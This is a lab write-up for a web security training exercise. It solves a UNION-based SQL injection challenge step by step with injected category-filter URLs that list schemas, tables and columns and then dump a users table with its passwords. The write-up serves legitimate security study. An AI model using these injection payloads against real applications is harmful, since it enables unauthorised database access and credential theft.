# `LAB`: SQL injection attack, listing the database contents on non-Oracle databases

## Descripción:

 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user. 

### Oracle Cheastsheet:

- [PortSwigger - SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


---

### Explicación:

- Muy similar a los laboratorios anteriores enfocados a diferentes RDBMS
- En este caso es llegar hasta el login con `adminsitrador`




## Solución:

````py
## Dumpear la base de Datos:
.web-security-academy.net/filter?category=-Pets' Union Select '1',schema_name FROM information_schema.schemata -- -
    # information_schema
    # public
    # pg_catalog

## Dumpear el Nombre de las Tablas:
.web-security-academy.net/filter?category=-Pets' Union Select '1',table_name FROM information_schema.tables WHERE table_schema = 'public' -- -
    # products
    # users_tcaine

## Dumpear el Nombre de las Columnas:
.web-security-academy.net/filter?category=-Pets' Union Select '1',column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users_tcaine' -- -
    # password_wyuxxb
    # username_fzanak

## Dumpear los Datos
.web-security-academy.net/filter?category=-Pets' Union Select '1',concat(password_wyuxxb,' ::: ',username_fzanak) from users_tcaine -- -
.web-security-academy.net/filter?category=-Pets' Union Select '1',password_wyuxxb||' : '||username_fzanak from users_tcaine -- -
    # ybh5rrmndjm9grpgaac3 ::: administrator
    # f18xc226xxi0tb4g9zpv ::: carlos
    # onix1tykwp2vvyphg0gb ::: wiener
````
